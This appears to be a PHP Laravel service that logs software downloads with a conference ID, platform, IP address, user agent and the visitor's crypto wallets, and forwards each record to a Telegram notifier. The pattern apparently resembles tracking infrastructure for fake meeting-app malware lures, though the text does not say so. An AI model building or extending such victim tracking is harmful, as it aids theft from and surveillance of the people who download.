<?php

namespace App\Services;

use App\Models\Download;
use App\Services\TelegramService;

class NotificationService
{
    public function __construct(
        private TelegramService $telegramService
    ) {}

    public function recordDownload(array $data): bool
    {
        $platform = $this->detectPlatform($data['ua'] ?? []);
        $type = $data['conferenceId'] ? 'conference' : 'general';
        $reference = $data['conferenceId'] ?? 'general';

        Download::create([
            'type' => $type,
            'reference_id' => $reference,
            'platform' => $platform,
            'tag' => $data['tag'] ?? null,
            'user_agent' => json_encode($data['ua'] ?? []),
            'wallets' => $data['wallets'] ?? [],
            'ip_address' => request()->ip()
        ]);

        $this->telegramService->notifyDownload(
            $type,
            $reference,
            $platform,
            request()->ip(),
            json_encode($data['ua'] ?? []),
            $data['wallets'] ?? []
        );

        return true;
    }

    private function detectPlatform(array $userAgent): string
    {
        if (isset($userAgent['os']['name'])) {
            return str_contains(strtolower($userAgent['os']['name']), 'mac') ? 'mac' : 'windows';
        }
        
        return 'unknown';
    }
}
